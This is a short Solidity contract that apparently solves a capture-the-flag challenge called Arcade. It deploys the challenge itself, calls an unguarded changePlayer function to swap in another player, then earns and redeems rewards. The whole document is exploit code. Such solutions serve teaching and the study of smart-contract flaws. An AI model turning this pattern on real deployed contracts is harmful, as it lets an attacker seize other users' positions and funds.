contract Me {
    ArcadeBase public arcadeBase;
    address public aa;

    function attack() public{
        arcadeBase = new ArcadeBase();
        arcadeBase.setup();
        aa = address(arcadeBase.arcade());
    }

    function change(address newPlayer) public  {
        Arcade arcade = Arcade(aa);
        arcade.changePlayer(newPlayer);
    }

    function earn() public  {
        Arcade arcade = Arcade(aa);
        arcade.earn();
        arcade.redeem();
    }
}
